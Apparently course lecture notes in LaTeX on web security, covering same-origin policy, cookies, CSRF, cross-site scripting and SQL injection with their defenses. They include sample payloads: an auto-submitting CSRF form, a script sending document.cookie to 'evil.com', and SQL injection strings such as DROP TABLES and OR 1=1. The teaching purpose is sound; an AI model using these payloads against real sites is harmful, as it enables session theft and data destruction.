@@ -1,0 +1,155 @@
+%!TEX root = InfoSec.tex
+% Lecture 12: 20 October 2014
+\sektion{12}{Web Security}
+\textit{Note: see piazza for lecture slides}
+
+\textbf{Two sides of web security}
+\begin{enumerate}
+	\item browser side
+	\item web applications\\
+		\hspace*{1cm} $\bullet$ written in php, asp, tsp, ruby, etc.\\
+		\hspace*{1cm} $\bullet$ include attacks like sql injection
+\end{enumerate}
+
+Some web threat models include passive or active network attackers, and malware attackers, who control a user's machine by getting them to download something.
+
+\subsektion{Browser execution model}
+\begin{enumerate}
+	\item Load content
+	\item Renders (processes html)
+	\item Responds to events
+		\begin{itemize}
+			\item User actions: onClick, onMouseover
+			\item Rendering: onLoad
+			\item Timing: setTimeout(), clearTimeout()\\
+		\end{itemize}
+\end{enumerate}
+
+\sidenote{
+	\textbf{Javascript}\\
+	There are three ways to include javascript in a webpage: \texttt{inline <script>}, in a linked file \texttt{<script src="something" >}, or in an event handler attribute \texttt{<a href="example.com"  onmouseover="alert(`hi')" >}
+
+	The script runs in a ``sandbox'' in the front end only.\\	
+	}
+
+\textbf{Same-origin policy}\\
+Scripts that originate from the same SERVER, PROTOCOL, and PORT may access each other/each other's DOMS with no problem, but they cannot access another site's DOM. The exception to this is when you link js with a \texttt{<script src="" >}.
+
+The user is able to grant privileges to signed scripts (UniversalBrowserRead/Write)
+
+\textbf{Frame and iFrame}\\
+A Frame is a rigid division. An iFrame is a floating inline frame. They provide structure to the page and delegate screen area to content from another source (like youtube embeds). The browser provides isolation between the frame and everything else in the DOM.
+
+\subsektion{Cookies}
+After a request, a server might do \texttt{set-cookie: value}. When the browser revisits the page, it will \texttt{GET ... cookie: value} and the server responds based on that cookie.\\
+
+Cookies hold unique pseudorandom values and the server has a table of values. So, cookies are often used alongside authentication. BUT it's only safe to use cookie authentication via HTTPS; otherwise, someone can read the ``authenticator cookie''.
+
+\subsektion{CSRF: Cross-Site Request Forgery}
+The same browser runs a script from a good site and malicious script from a bad site. Requests to the good site are authenticated by cookies. The malicious script can make forged requests to the good site with the user's cookie.
+\begin{itemize}
+	\item Netflix: change account settings
+	\item Gmail: steal contacts
+	\item potential for much bigger damage (ie. banking)
+\end{itemize}
+
+How might this happen?
+\begin{enumerate}
+	\item User establishes session with victimized server
+	\item User visits the attack server
+	\item User receives malicious page
+		\begin{verbatim}
+		<form action="victimized server page form">
+		    <input> fields </input>
+		</form>
+		<script> document.forms[0].submit() </script>
+		\end{verbatim}
+	\item attack server sends forgest request to victimized server via the user and this form
+\end{enumerate}
+
+\textit{Login CSRF}\\
+Attacker sends request so that victim is logged in as attacker. Everything the victim does gets recorded on the attacker's account; or, if the victim is receiving incoming payments/messages, the attacker will get them.
+
+\textbf{CSRF Defenses}
+\begin{itemize}
+	\item Secret validation token
+		% this is what att does in the phone history checker
+		\texttt{<input type="hidden" value="1124lfjq2l3ir" >}
+
+		You want to bind the sessionID to a particular token. How? (1) a state table at the server or (2) HMAC of sessionID
+	\item Referer validation (in the header). An attacker script will say that referer is ``attacker.com''
+
+		Lenient: referer in header=optional\\
+		Strict: referer in header=required\\
+
+		To prevent login CSRF, you want strict referer validation and login forms submitted over HTTPS. HTTPS sites in general use strict referer validation. Other sites use ROR or frameworks that implement this stuff for you.
+	\item Custom HTTP header. \texttt{X-Requested-By: XMLHttpRequest}	
+\end{itemize}
+
+\subsektion{Cross Site Scripting (CSS)}
+\begin{example}
+evil.com sends the victim a frame:
+	\begin{verbatim}
+	<frame src="naive.com/hello?name=
+	    <script>window.open('evil.com/steal.cgi?cookie='' + document.cookie)</script>
+	">
+	\end{verbatim}
+Then, naive.com is opened and the script is executed, where the referer looks like naive.com. The naive.com cookie is sent as a parameter in a request to evil.com, and steal.cgi is executed with the cookie.
+\end{example}
+
+\textbf{Other CSS risks}\\
+A form of ``reflection attack'' can change the contents of the affected website by manipulating DOM components. For example, an adversary may change form fields.
+
+\textbf{Defenses}\\
+\begin{enumerate}
+	\item Escape output so that in the above example, you would display 
+		\begin{verbatim}
+			$lt;script$gt; post(evil.com, document.cookie) ...
+		\end{verbatim}
+		instead of executing a script
+	\item Sanitize inputs by stripping all tags $<>$
+\end{enumerate}
+
+\subsektion{SQL injection}
+
+\begin{example}
+	\texttt{'); Drop Tables; --}\\
+	\hspace*{2cm}deletes tables
+\end{example}
+
+\begin{example}
+	\verb|SELECT * WHERE user ='' OR WHERE pwd LIKE '%'|\\
+	\hspace*{2cm}will select every row and login with their credentials.
+\end{example}
+
+\begin{example}
+	\verb|authenticate if username="valid_user" OR 1=1 |\\
+	\hspace*{2cm} $1=1$ is always true, will give you data/allow you to login. can then setup account for bad guy on DB server itself.
+\end{example}
+
+
+\begin{example}
+	\verb|... UNION SELECT * FROM credit cards|\\
+	\hspace*{2cm} can pull data from other tables
+\end{example}
+
+\textbf{Defenses}\\
+\begin{itemize}
+	\item Input validation
+
+		Filter out apostrophes, semicolons, \%, hyphens, underscores. Also check data type (eg. make sure an integer field actually contains an int)
+	\item Whitelisting
+
+		Generally better than blacklisting (like above) because
+		\begin{itemize}
+			\item you might forget to filter out certain characters
+			\item blacklisting could prevent some valid input (like last name O'Brien)
+			\item allowing only a well-definied set of safe values is simpler
+		\end{itemize}
+	\item escape quotes
+	\item use prepared statements
+	\item Blind variables:
+
+		\texttt{?} placeholders guaranteed to be data and not a control sequence %this is what Cherokee did
+\end{itemize}
+
